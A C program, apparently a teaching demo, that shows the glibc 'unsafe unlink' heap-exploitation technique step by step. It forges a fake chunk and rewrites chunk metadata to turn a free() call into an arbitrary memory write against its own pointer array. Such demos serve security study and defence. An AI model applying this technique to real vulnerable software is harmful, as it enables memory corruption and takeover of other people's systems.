#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t* pointer_vector[10];


void print_pointer_vector(){
	int i;
	for(i=0;i<2;i++){
		printf("pointer_vector[%d]: %p --> %p\n",i,&(pointer_vector[i]),pointer_vector[i]);
	}
}


int main()
{
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04 64bit.\n");
	printf("This technique can be used when you have contiguous malloc'ed regions pointed by an array of pointers in a known location\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	printf("We create an array of pointers to malloc'ed regions.\n");
	printf("The point of this exercise is to use malloc to corrupt one of these pointers to achieve arbitrary memory write.\n\n");

	pointer_vector[0] = (uint64_t*) malloc(malloc_size); //chunk0
	pointer_vector[1] = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The pointer vector starts at: %p\n",&(pointer_vector[0]));
	print_pointer_vector();
	
	printf("We create a fake chunk inside in the first allocated region.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to pointer_vector[0] so that P->fd->bk = P.\n");
	pointer_vector[0][2] = (uint64_t) &(pointer_vector[0])-(sizeof(uint64_t)*3);
	printf("We setup the 'next_free_chunk' (bk) of our fake chunk to point near to pointer_vector[0] so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) != False\n");
	pointer_vector[0][3] = (uint64_t) &(pointer_vector[0])-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) pointer_vector[0][2]);
	printf("Fake chunk bk: %p\n",(void*) pointer_vector[0][3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t* chunk1_ptr = pointer_vector[1] - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	chunk1_ptr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_ptr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n");
	chunk1_ptr[1] &= ~1;
	
	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting pointer_vector[0].\n");
	free(pointer_vector[1]);
	print_pointer_vector();

	printf("At this point we can use pointer_vector[0] to overwrite itself (or any other pointer in pointer_vector) to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	pointer_vector[0][3] = (uint64_t) victim_string;
	print_pointer_vector();

	printf("pointer_vector[0] is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	pointer_vector[0][0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);
}


